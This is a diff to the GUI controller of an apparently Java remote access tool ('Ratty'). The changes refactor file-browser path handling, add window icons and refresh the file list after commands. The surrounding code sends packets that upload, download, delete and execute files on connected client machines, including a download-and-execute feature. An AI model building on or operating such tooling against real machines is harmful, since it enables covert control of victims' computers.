@@ -63,6 +63,7 @@ import de.sogomn.rat.server.AbstractRattyController;
 import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.util.FrameEncoder.Frame;
 import de.sogomn.rat.util.JarBuilder;
+import de.sogomn.rat.util.Resources;
 import de.sogomn.rat.util.XorCipher;
 
 /*
@@ -183,7 +184,9 @@ public final class RattyGuiController extends AbstractRattyController implements
 		clients = new HashMap<ActiveConnection, ServerClient>();
 		
 		serverList.addListener(this);
+		serverList.setIcons(Resources.WINDOW_ICON_LIST);
 		builder.addListener(this);
+		builder.setIcons(Resources.WINDOW_ICON_LIST);
 		gui.addListener(this);
 		gui.setVisible(true);
 		
@@ -306,7 +309,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private DownloadFilePacket createDownloadPacket(final ServerClient client) {
-		final String path = client.fileBrowser.getSelectedFile().toString();
+		final String path = client.fileBrowser.getSelectedFilePath();
 		final DownloadFilePacket packet = new DownloadFilePacket(path);
 		
 		return packet;
@@ -318,7 +321,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		if (file != null) {
 			final String fileName = file.getFileName().toString();
 			final byte[] data = FileUtils.readExternalData(file.toString());
-			final String path = client.fileBrowser.getCurrentDirectory() + SEPARATOR + fileName;
+			final String path = client.fileBrowser.getCurrentDirectoryPath() + SEPARATOR + fileName;
 			final UploadFilePacket packet = new UploadFilePacket(path, data);
 			
 			return packet;
@@ -328,24 +331,24 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private ExecuteFilePacket createExecutePacket(final ServerClient client) {
-		final String path = client.fileBrowser.getSelectedFile().toString();
+		final String path = client.fileBrowser.getSelectedFilePath();
 		final ExecuteFilePacket packet = new ExecuteFilePacket(path);
 		
 		return packet;
 	}
 	
 	private DeleteFilePacket createDeletePacket(final ServerClient client) {
-		final String path = client.fileBrowser.getSelectedFile().toString();
+		final String path = client.fileBrowser.getSelectedFilePath();
 		final DeleteFilePacket packet = new DeleteFilePacket(path);
 		
 		return packet;
 	}
 	
 	private NewDirectoryPacket createDirectoryPacket(final ServerClient client) {
-		final String input = gui.getInput();
+		final String input = client.fileBrowser.getInput();
 		
 		if (input != null) {
-			final String path = client.fileBrowser.getCurrentDirectory() + SEPARATOR + input;
+			final String path = client.fileBrowser.getCurrentDirectoryPath() + SEPARATOR + input;
 			final NewDirectoryPacket packet = new NewDirectoryPacket(path);
 			
 			return packet;
@@ -370,7 +373,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final String address = gui.getInput(URL_MESSAGE);
 		
 		if (address != null) {
-			final String path = client.fileBrowser.getCurrentDirectory().toString();
+			final String path = client.fileBrowser.getCurrentDirectoryPath().toString();
 			final DownloadUrlPacket packet = new DownloadUrlPacket(address, path);
 			
 			return packet;
@@ -390,7 +393,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final Path file = getFile();
 		
 		if (file != null) {
-			final String path = client.fileBrowser.getCurrentDirectory() + file.getFileName().toString();
+			final String path = client.fileBrowser.getCurrentDirectoryPath() + "/" + file.getFileName();
 			final byte[] data = FileUtils.readExternalData(file.toString());
 			final UploadFilePacket packet = new UploadFilePacket(path, data, true);
 			
@@ -401,7 +404,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private DownloadUrlPacket createDropExecutePacket(final ServerClient client) {
-		final String address = gui.getInput(URL_MESSAGE);
+		final String address = client.fileBrowser.getInput(URL_MESSAGE);
 		
 		if (address != null) {
 			final DownloadUrlPacket packet = new DownloadUrlPacket(address, "", true);
@@ -671,6 +674,20 @@ public final class RattyGuiController extends AbstractRattyController implements
 		return packet;
 	}
 	
+	private void refreshFileBrowser(final ServerClient client) {
+		final String path = client.fileBrowser.getCurrentDirectoryPath();
+		final FileRequestPacket packet = new FileRequestPacket(path);
+		
+		client.fileBrowser.clearFiles();
+		client.connection.addPacket(packet);
+	}
+	
+	/*
+	 * ==================================================
+	 * HANDLING COMMANDS END
+	 * ==================================================
+	 */
+	
 	private void handleCommand(final ServerClient client, final String command) {
 		if (command == IRattyGui.BROWSE_FILES) {
 			browseFiles(client);
@@ -688,6 +705,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 			client.logger.clear();
 		} else if (command == IFileBrowserGui.DIRECTORY_UP) {
 			fileBrowserDirectoryUp(client);
+		} else if (command == IFileBrowserGui.DELETE) {
+			refreshFileBrowser(client);
+		} else if (command == IFileBrowserGui.DROP_FILE) {
+			refreshFileBrowser(client);
+		} else if (command == IFileBrowserGui.NEW_DIRECTORY) {
+			refreshFileBrowser(client);
+		} else if (command == IFileBrowserGui.UPLOAD) {
+			refreshFileBrowser(client);
 		}
 	}
 	
@@ -798,7 +823,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final String[] directoryPaths = packet.getDirectoryPaths();
 		
 		for (final String file : filePaths) {
-			client.fileBrowser.addPath(file);
+			client.fileBrowser.addFilePath(file);
 		}
 		
 		for (final String directory : directoryPaths) {
@@ -986,7 +1011,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	/*
 	 * ==================================================
-	 * HANDLING END
+	 * HANDLING PACKETS END
 	 * ==================================================
 	 */
 	
